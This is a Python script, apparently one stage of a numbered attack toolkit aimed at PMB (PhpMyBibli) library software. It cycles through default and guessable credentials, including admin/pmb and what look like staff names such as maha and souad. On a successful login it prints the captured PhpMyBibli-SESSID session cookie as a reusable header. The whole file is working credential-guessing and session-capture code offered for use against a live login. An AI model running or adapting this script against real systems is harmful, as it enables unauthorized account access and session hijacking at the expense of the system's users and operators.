#!/usr/bin/env python3
"""Stage 4 — test credentials and capture a session.

Usage:
  python 03_login.py                 # try the default list
  python 03_login.py admin s3cret    # try one pair
"""
import sys

import common as c

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "pmb"),
    ("admin", "library"),
    ("maha", "maha"),
    ("souad", "souad"),
]


def main(argv):
    pairs = [(argv[0], argv[1])] if len(argv) >= 2 else DEFAULT_CREDS
    for user, password in pairs:
        cookies = c.login(user, password)
        if cookies:
            c.out("[+] %s / %s  -> SESSID %s" % (user, password, cookies["PhpMyBibli-SESSID"]))
            c.out("    cookie header:")
            c.out("    " + c.cookie_header(cookies))
            return 0
        c.out("[-] %s / %s" % (user, password))
    c.out("[!] no credentials worked")
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
